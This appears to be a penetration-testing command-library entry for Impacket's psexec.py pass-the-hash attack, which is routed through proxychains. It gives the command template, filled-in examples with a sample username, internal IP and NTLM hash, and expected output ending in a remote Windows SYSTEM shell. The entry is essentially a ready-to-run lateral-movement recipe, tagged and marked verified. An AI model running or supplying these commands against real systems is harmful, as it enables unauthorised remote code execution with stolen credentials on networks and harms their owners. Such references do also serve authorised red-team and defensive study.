---
type: command
executor: bash
data: 'proxychains python ./psexec.py $_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH'
output: null
created_at: '2023-04-06T03:56:05Z'
updated_at: '2023-04-10T20:25:57Z'
platforms:
  - Linux
tags:
  - lateral-movement
  - pass-the-hash
verified: true
validated: true
---

# impacket-psexec-pass-the-hash

## Command

```bash
proxychains python ./psexec.py $_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
```

## Description

Executes Impacket's psexec.py tool via proxychains to perform Pass-the-Hash over SMB, providing an interactive shell on the remote Windows target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Username for authentication | Yes |
| $_TARGET_IP | Target IP address | Yes |
| $_NTLM_HASH | NTLM hash (LM assumed blank) | Yes |
| proxychains | Routes traffic through configured proxies | No (for direct access) |

## Examples

### Basic Usage

```bash
proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
```

### Advanced Usage

```bash
proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d -k -no-pass
```

## Expected Output

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.2.0.2.....
[*] Found writable share ADMIN$
[*] Uploading file CYbTHqV.exe
[*] Opening SVCManager on 10.2.0.2...
[*] Creating service gqJ on 10.2.0.2...
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
C:\Windows\system32>_

## Related

- [[procedures/Pass-the-Hash-Active-Directory-Attack]]
- [[commands/crackmapexec-smb-execute-whoami]]
